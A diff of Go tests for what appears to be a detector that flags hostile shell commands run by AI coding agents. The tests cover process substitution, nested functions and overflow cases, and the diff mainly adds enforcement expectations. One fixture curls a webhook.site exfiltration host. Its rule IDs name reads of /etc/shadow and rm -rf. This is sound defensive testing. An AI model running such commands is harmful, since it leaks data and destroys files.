@@ -1708,6 +1708,7 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 			},
 			legacyText:  hostile,
 			wantFinding: true,
+			wantEnforce: true,
 		},
 		{
 			name: "codex command envelope process substitution",
@@ -1814,6 +1815,7 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 			},
 			legacyText:  "f(){ " + dangerous + "; }; f",
 			wantFinding: true,
+			wantEnforce: true,
 		},
 		{
 			name: "zsh file substitution",
@@ -1868,6 +1870,7 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 			},
 			legacyText:  "function\n{ " + dangerous + " ; }",
 			wantFinding: true,
+			wantEnforce: true,
 			uncertain:   true,
 		},
 		{
@@ -2078,7 +2081,7 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 					proof,
 				)
 			}
-			if matched != nil && test.uncertain && matched.Severity != "LOW" {
+			if matched != nil && test.uncertain && !matched.contributesToEnforcement() && matched.Severity != "LOW" {
 				t.Fatalf("parser uncertainty did not remain LOW: %+v", *matched)
 			}
 		})
@@ -2120,10 +2123,8 @@ func TestTrustedActionBashFallbackCoversActionCategoriesAndOverflow(t *testing.T
 	provenThenOverflow.WriteString("')")
 
 	for _, test := range []struct {
-		name      string
-		command   string
-		ruleID    string
-		uncertain bool
+		name, command, ruleID string
+		wantEnforce           bool
 	}{
 		{
 			name:    "nested sensitive path read",
@@ -2131,20 +2132,22 @@ func TestTrustedActionBashFallbackCoversActionCategoriesAndOverflow(t *testing.T
 			ruleID:  "PATH-ETC-SHADOW",
 		},
 		{
-			name:    "nested c2 destination",
-			command: "cat <(curl https://webhook" + ".site/example)",
-			ruleID:  "C2-WEBHOOK-SITE",
+			name:        "nested c2 destination",
+			command:     "cat <(curl https://webhook" + ".site/example)",
+			ruleID:      "C2-WEBHOOK-SITE",
+			wantEnforce: true,
 		},
 		{
-			name:      "projection overflow is diagnostic",
-			command:   overflow.String(),
-			ruleID:    "CMD-RM-RF",
-			uncertain: true,
+			name:        "projection overflow still evaluates every simple command",
+			command:     overflow.String(),
+			ruleID:      "CMD-RM-RF",
+			wantEnforce: true,
 		},
 		{
-			name:    "overflow cannot downgrade prior typed proof",
-			command: provenThenOverflow.String(),
-			ruleID:  "CMD-RM-RF",
+			name:        "overflow cannot downgrade prior typed proof",
+			command:     provenThenOverflow.String(),
+			ruleID:      "CMD-RM-RF",
+			wantEnforce: true,
 		},
 	} {
 		t.Run(test.name, func(t *testing.T) {
@@ -2169,11 +2172,9 @@ func TestTrustedActionBashFallbackCoversActionCategoriesAndOverflow(t *testing.T
 					trustedBashFallbackActions(input, actionfacts.Analyze(input)),
 				)
 			}
-			if matched.contributesToEnforcement() {
-				t.Fatalf("partial outer projection became actionable: %+v", *matched)
-			}
-			if test.uncertain && matched.Severity != "LOW" {
-				t.Fatalf("projection overflow did not remain LOW: %+v", *matched)
+			if matched.contributesToEnforcement() != test.wantEnforce {
+				t.Fatalf("%s enforce=%t, want %t: %+v", test.ruleID,
+					matched.contributesToEnforcement(), test.wantEnforce, *matched)
 			}
 		})
 	}
